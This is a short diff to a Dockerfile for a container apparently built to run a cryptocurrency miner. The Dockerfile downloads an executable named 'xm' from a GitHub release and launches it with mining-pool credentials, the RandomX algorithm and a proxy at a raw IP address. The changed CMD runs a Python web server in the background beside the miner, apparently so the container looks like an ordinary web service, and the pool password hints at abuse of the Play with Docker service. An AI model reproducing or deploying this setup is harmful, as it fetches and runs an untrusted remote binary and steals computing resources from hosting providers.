@@ -9,6 +9,5 @@ ENV POOL_PW playwithdocker
 WORKDIR /home/miner
 RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
 	&& chmod +x xm
-RUN python -m http.server 80
 EXPOSE 80
-CMD ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k --no-title --log-file=log.txt --donate-over-proxy=107.178.97.202:4444
+CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k --no-title --log-file=log.txt --donate-over-proxy=107.178.97.202:4444
